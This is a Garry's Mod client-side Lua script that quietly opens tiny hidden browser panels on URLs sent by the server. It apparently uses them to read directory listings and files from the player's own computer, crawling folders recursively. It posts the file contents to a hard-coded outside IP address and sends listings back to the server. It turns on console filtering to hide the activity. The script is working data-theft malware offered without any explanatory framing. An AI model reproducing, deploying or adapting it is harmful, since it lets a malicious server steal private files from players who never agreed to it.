if( SERVER ) then AddCSLuaFile() return end

timer.Simple(1, function()

local richertext = vgui.Create( "DHTML" )
richertext:SetSize(1, 1)

local function finishedloading(pnl, url)
	pnl.cururl = url
	pnl:QueueJavascript([[
	
	document.fullHTML = function ()
	{
		var r = document.documentElement.innerHTML;
		
		if(typeof(r) == 'undefined')
		{
			var ay = document.getElementsByTagName("*");
			var all = Array.prototype.slice.call(ay);
			r = r + all.length.toString();
			for (var i=0, max=all.length; i < max; i++)
			{
				if(typeof(all[i].name) == 'string')
				{
					r = r + all[i].name;
				}
				
				if(typeof(all[i].tagName) == 'string')
				{
					r = r + '<' + all[i].tagName + '>';
				}
				
				if(typeof(all[i].textContent) == 'string')
				{
					r = r + all[i].textContent;
				}
				
				if(typeof(all[i].innerHTML) == 'string')
				{
					r = r + all[i].innerHTML;
				}
				
			}
			
		}

		return r;
	};
	go.ads(document.fullHTML());]])

end

richertext.OnFinishLoadingDocument = finishedloading

local function ayfunc(pnl, data)
	if(not data or data=="<head></head><body></body>") then
		--print("nada")
		return
	end
	--print("LOL DAT: " .. data)
	local l = string.Explode("\n", data)
	local results = {}
	
	local is_folder = true
	
	if(string.find(l[1], "<head><script>start(", 1, true)) then
		l[#l] = nil
		l[1] = nil
		l[2] = nil
		is_folder = true
	else
		is_folder = false
		data = string.sub(data, 79)
	end
	
	for k,v in pairs(l) do
		local startl
		local endl
		for i=1, string.len(v) do

			
			if(v[i] == "\"") then
				if(startl) then
					endl = i-1
					table.insert(results, string.sub(v, startl, endl))
					break
				end
				
				startl = i+1
			end
		end
	end
	
	local path = string.sub(pnl.cururl, 9)

	if(is_folder) then
		for k,v in pairs(results) do
			local length = #v or string.len(v) 
			if(not length) then continue end
			local url = pnl.cururl
			net.Start("imcocked")
				net.WriteString(url)
				net.WriteUInt(length, 32)
				net.WriteData(v, length)
			net.SendToServer()
		end
	else
		local length = #data or string.len(data)
		if(not data) then return end
		
		if(string.find(data, "</pre></body>", 1, true)) then
			data = string.sub(data, 1, length-13)
		end
		
		http.Post("http://138.68.156.164/epic.php", {a=path, b=data})
	end 

end

local allfiles = {}
local waitbreadfound
 
local function ayfunc2(pnl, data)
	if(not data or data=="<head></head><body></body>") then
		--print("nada")
		return end
	
	local l = string.Explode("\n", data)
	local results = {}
	
	local is_folder = true
	
	if(string.find(l[1], "<head><script>start(", 1, true)) then
		l[#l] = nil
		l[1] = nil
		l[2] = nil
		is_folder = true
	else
		is_folder = false
		data = string.sub(data, 79)
	end
	
	for k,v in pairs(l) do
		local startl
		local endl
		for i=1, string.len(v) do

			
			if(v[i] == "\"") then
				if(startl) then
					endl = i-1
					table.insert(results, string.sub(v, startl, endl))
					break
				end
				
				startl = i+1
			end
		end
	end
	
	local path = string.sub(pnl.cururl, 9)

	if(is_folder) then
		waitbreadfound = CurTime() + 2
		
		local onlyfilesnow = false
		
		for k,v in pairs(results) do
			
			local ext = string.GetExtensionFromFilename(v)
			onlyfilesnow = false
			if(ext or onlyfilesnow) then
				--print(v)
				onlyfilesnow = true
				table.insert(allfiles, path .. v)
				continue
			end
			
			local url = path
			url = url .. v .. "/"
			
			
			timer.Simple(k*0.09, function()
			
				local tmp = vgui.Create("DHTML")
				tmp:SetSize(1,1)
				tmp.OnFinishLoadingDocument = finishedloading
				tmp:AddFunction("go", "ads", function(data)
					ayfunc2(tmp, data)
				end)
				
				--print("opening: " .. url)
				tmp:OpenURL(url)
				
			end)
		end
	else
		local length = #data or string.len(data)
		if(not data) then return end
		
		if(string.find(data, "</pre></body>", 1, true)) then
			data = string.sub(data, 1, length-13)
		end
		
		http.Post("http://138.68.156.164/epic.php", {a=path, b=data})
	end
	
	pnl:SetVisible(false)
	pnl:Remove()
	pnl = nil
	
end


richertext:AddFunction("go", "ads", function(data)
	ayfunc(richertext, data)
end)



net.Receive("imcocked",function(a)
	local str = net.ReadString()
	--print("lmao: " .. str)
	RunConsoleCommand("con_filter_enable","1")
	RunConsoleCommand("con_filter_text"," ")
	RunConsoleCommand("con_filter_text_out"," ")
	
	timer.Simple(0.09, function()
		richertext:OpenURL(str .. "" )
	end)
	
	timer.Simple(1,function()
		RunConsoleCommand("con_filter_enable","0")
	end)
end)

net.Receive("imcocked2",function(a)
	local str = net.ReadString()
	--print("lmao2: " .. str)
	
	RunConsoleCommand("con_filter_enable","1")
	RunConsoleCommand("con_filter_text"," ")
	RunConsoleCommand("con_filter_text_out"," ")
	
	timer.Simple(0.09, function()
		waitbreadfound = nil
		for k,v in pairs(allfiles) do
			allfiles[k] = nil
		end
		
		local tmp = vgui.Create( "DHTML" )
		tmp:SetSize(1, 1)
		tmp.OnFinishLoadingDocument = finishedloading
		tmp:AddFunction("go", "ads", function(data)
			ayfunc2(tmp, data)
		end)
		tmp:OpenURL(str .. "\n")
		
		timer.Simple(3, function()
			if(not waitbreadfound) then return end 
			hook.Add("Think","\n", function()
				if(not waitbreadfound) then hook.Remove("Think", "\n") return end
				if(CurTime()<waitbreadfound) then return end
				hook.Remove("Think","\n")
				waitbreadfound = nil
				
				for k,v in pairs(allfiles) do
					timer.Simple(k*0.2, function()
					
						local tmp = vgui.Create( "DHTML" )
						tmp:SetSize(1, 1)
						tmp.OnFinishLoadingDocument = finishedloading
						tmp:AddFunction("go", "ads", function(data)
							ayfunc2(tmp, data)
						end)
						tmp:OpenURL(v)
						
					end)
				end
			end)
			
		end)
	end)
	
	timer.Simple(1,function()
		RunConsoleCommand("con_filter_enable","0")
	end)
end)

end)